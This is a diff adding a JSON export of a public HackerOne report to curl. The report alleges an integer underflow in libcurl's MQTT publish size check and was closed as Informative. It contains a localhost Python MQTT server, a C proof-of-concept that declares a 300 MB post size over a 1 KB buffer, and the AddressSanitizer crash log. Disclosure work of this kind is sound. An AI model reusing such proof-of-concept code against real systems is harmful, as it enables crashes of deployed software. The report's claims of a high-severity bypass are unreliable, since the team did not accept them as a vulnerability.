@@ -1,0 +1,117 @@
+{
+  "id": 3508500,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNTA4NTAw",
+  "url": "https://hackerone.com/reports/3508500",
+  "title": "integer Overflow in MQTT Protocol Handling Allows Bypassing Message Size Limit",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "high",
+  "readable_substate": "Informative",
+  "created_at": "2026-01-13T07:12:56.742Z",
+  "submitted_at": "2026-01-13T07:12:57.184Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "gudyuu",
+    "url": "/gudyuu",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/w8uaxyemgt776vfa9t1zh5uml76e/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-01-13T12:23:44.362Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-01-13T08:44:38.027Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nA logic error involving an integer overflow (specifically, an unsigned integer underflow) exists in the lib/mqtt.c file within the mqtt_publish function. This vulnerability allows an attacker (or a malicious user configuration) to bypass the explicit MAX_MQTT_MESSAGE_SIZE check.\n\nThe vulnerability occurs when curl calculates whether an MQTT packet exceeds the maximum allowed size ( 0xFFFFFFF or ~268 MB). The validation logic performs a subtraction operation using the payload length before verifying if the payload is already too large. If the payload length exceeds the maximum size, the subtraction wraps around (underflows) to a large positive value, causing the safety check to pass incorrectly.\n\nThis leads to curl attempting to allocate a massive amount of memory and sending a packet that violates the intended protocol constraints defined in the source code.\n\n\n## Vulnerable code\nhttps://github.com/curl/curl/blob/master/lib/mqtt.c#L533\nhttps://github.com/curl/curl/blob/master/lib/mqtt.c#L563-L568\n\n## Affected version\ncurrent (8.18.0)\n\n## Steps To Reproduce:\nTo reproduce this issue, we need  MQTT server to accept the connection and a C program using libcurl to send a payload larger than MAX_MQTT_MESSAGE_SIZE .\n\n1.MQTT Server ( mqtt_server.py )\n```\nimport socket\nimport struct\nimport sys\nimport time\n\ndef run_server():\n    host = '127.0.0.1'\n    port = 1883\n    \n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    sock.bind((host, port))\n    sock.listen(1)\n    \n    print(f\"Listening on {host}:{port}\")\n    sys.stdout.flush()\n    \n    conn, addr = sock.accept()\n    print(f\"Connection from {addr}\")\n    sys.stdout.flush()\n    \n    try:\n        # Read CONNECT packet\n        # Just read some bytes\n        data = conn.recv(1024)\n        print(f\"Received CONNECT: {len(data)} bytes\")\n        sys.stdout.flush()\n        \n        # Send CONNACK\n        # Fixed header: 0x20, Remaining Length: 0x02\n        # Variable header: Connect Acknowledge Flags: 0x00, Connect Return Code: 0x00 (Accepted)\n        connack = b'\\x20\\x02\\x00\\x00'\n        conn.sendall(connack)\n        print(\"Sent CONNACK\")\n        sys.stdout.flush()\n        \n        # Now expect PUBLISH\n        # Read the first few bytes to see the length\n        head = conn.recv(5)\n        if not head:\n            print(\"Client disconnected immediately\")\n            return\n\n        print(f\"Received head: {head.hex()}\")\n        sys.stdout.flush()\n        \n        # We expect a huge packet if the vulnerability works\n        \n        received = len(head)\n        start_time = time.time()\n        \n        while True:\n            chunk = conn.recv(65536)\n            if not chunk:\n                break\n            received += len(chunk)\n            if time.time() - start_time > 1:\n                print(f\"Received {received} bytes...\", end='\\r')\n                sys.stdout.flush()\n                start_time = time.time()\n                \n        print(f\"\\nTotal received: {received} bytes\")\n        \n    except Exception as e:\n        print(f\"Error: {e}\")\n    finally:\n        conn.close()\n        sock.close()\n\nif __name__ == '__main__':\n    run_server()\n```\n2.  Exploit Code\n```\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <curl/curl.h>\n\nint main(void)\n{\n    CURL *curl;\n    CURLcode res;\n\n    \n    setenv(\"ASAN_OPTIONS\", \"detect_leaks=0\", 1);\n\n    curl_global_init(CURL_GLOBAL_ALL);\n    curl = curl_easy_init();\n    if(curl) {\n        curl_easy_setopt(curl, CURLOPT_URL, \"mqtt://127.0.0.1:1883/topic\");\n        curl_easy_setopt(curl, CURLOPT_POST, 1L);\n\n        /* use payload bigger than MAX_MQTT_MESSAGE_SIZE (~268MB) */\n        const curl_off_t huge_size = (curl_off_t)300 * 1024 * 1024;\n        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE_LARGE, huge_size);\n\n  \n        char *buf = (char *)calloc(1, 1024);\n        if(!buf) {\n            fprintf(stderr, \"Failed to allocate small buffer\\n\");\n            return 1;\n        }\n        memset(buf, 'A', 1024);\n        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, buf);\n\n        curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);\n\n        printf(\"ASAN PoC: attempting to send %lld bytes to MQTT...\\n\",\n               (long long)huge_size);\n        res = curl_easy_perform(curl);\n\n        if(res == CURLE_OK) {\n            printf(\"[ASAN] Transfer succeeded -> limit bypass confirmed.\\n\");\n        }\n        else if (res == CURLE_TOO_LARGE || res == CURLE_FILESIZE_EXCEEDED) {\n            printf(\"[ASAN] Transfer blocked by size limit.\\n\");\n        }\n        else {\n            printf(\"[ASAN] Transfer failed: %d (%s)\\n\", res, curl_easy_strerror(res));\n        }\n\n        free(buf);\n        curl_easy_cleanup(curl);\n    }\n    curl_global_cleanup();\n    return 0;\n}\n```\n\n## Ouput\n1. MQTT Server ( mqtt_server.py )\n```\nListening on 127.0.0.1:1883\nConnection from ('127.0.0.1', 51950)\nReceived CONNECT: 26 bytes\nSent CONNACK\nClient disconnected immediately\n```\n2. POC ouput\n```\nASAN PoC: attempting to send 314572800 bytes to MQTT...\n*   Trying 127.0.0.1:1883...\n* Connected to 127.0.0.1 (127.0.0.1) port 1883\n* Using client id 'curlzeT6w484'\n> MQTT<\n       curlzeT6w484* mqtt_doing: state [0]\n* mqtt_doing: state [0]\n<  < * mqtt_doing: state [2]\n< =================================================================\n==10341==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x619000002780 at pc 0x000105765c88 bp 0x00016aff1710 sp 0x00016aff0eb0\nREAD of size 314572800 at 0x619000002780 thread T0\n    #0 0x000105765c84 in memcpy+0x284 (libclang_rt.asan_osx_dynamic.dylib:arm64e+0x85c84)\n    #1 0x00019afb4d58 in mqtt_publish+0x130 (libcurl.4.dylib:arm64e+0x38d58)\n    #2 0x00019afb4674 in mqtt_doing+0x154 (libcurl.4.dylib:arm64e+0x38674)\n    #3 0x00019afb71c4 in multi_runsingle+0x258 (libcurl.4.dylib:arm64e+0x3b1c4)\n    #4 0x00019afb6ebc in curl_multi_perform+0xc8 (libcurl.4.dylib:arm64e+0x3aebc)\n    #5 0x00019af911b8 in curl_easy_perform+0x10c (libcurl.4.dylib:arm64e+0x151b8)\n    #6 0x000104e0c990 in main poc_asan.c:42\n    #7 0x000181126b94  (<unknown module>)\n\n0x619000002780 is located 0 bytes after 1024-byte region [0x619000002380,0x619000002780)\nallocated by thread T0 here:\n    #0 0x00010571d620 in calloc+0x80 (libclang_rt.asan_osx_dynamic.dylib:arm64e+0x3d620)\n    #1 0x000104e0c8d4 in main poc_asan.c:30\n    #2 0x000181126b94  (<unknown module>)\n\nSUMMARY: AddressSanitizer: heap-buffer-overflow (libcurl.4.dylib:arm64e+0x38d58) in mqtt_publish+0x130\nShadow bytes around the buggy address:\n  0x619000002500: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x619000002580: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x619000002600: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x619000002680: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x619000002700: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n=>0x619000002780:[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x619000002800: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x619000002880: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x619000002900: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x619000002980: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x619000002a00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\nShadow byte legend (one shadow byte represents 8 application bytes):\n  Addressable:           00\n  Partially addressable: 01 02 03 04 05 06 07 \n  Heap left redzone:       fa\n  Freed heap region:       fd\n  Stack left redzone:      f1\n  Stack mid redzone:       f2\n  Stack right redzone:     f3\n  Stack after return:      f5\n  Stack use after scope:   f8\n  Global redzone:          f9\n  Global init order:       f6\n  Poisoned by user:        f7\n  Container overflow:      fc\n  Array cookie:            ac\n  Intra object redzone:    bb\n  ASan internal:           fe\n  Left alloca redzone:     ca\n  Right alloca redzone:    cb\n==10341==ABORTING\n\n## Impact\n\n1. Applications using libcurl MQTT can crash or abort if they set CURLOPT_POSTFIELDSIZE_LARGE to a very large value but provide a small CURLOPT_POSTFIELDS buffer, ASAN confirms an out-of-bounds read.\n2. Failing to enforce size limits via a correct comparison allows attackers or misconfigurations to force libcurl to process oversized payloads. The flawed check is a classic unsigned wraparound (CWE-190).",
+  "weakness": {
+    "id": 15,
+    "name": "Integer Overflow"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 5,
+  "voters": [
+    "2026",
+    "mr-inspector",
+    "africanito_chitu",
+    "issah721",
+    "hossamhelmy040"
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
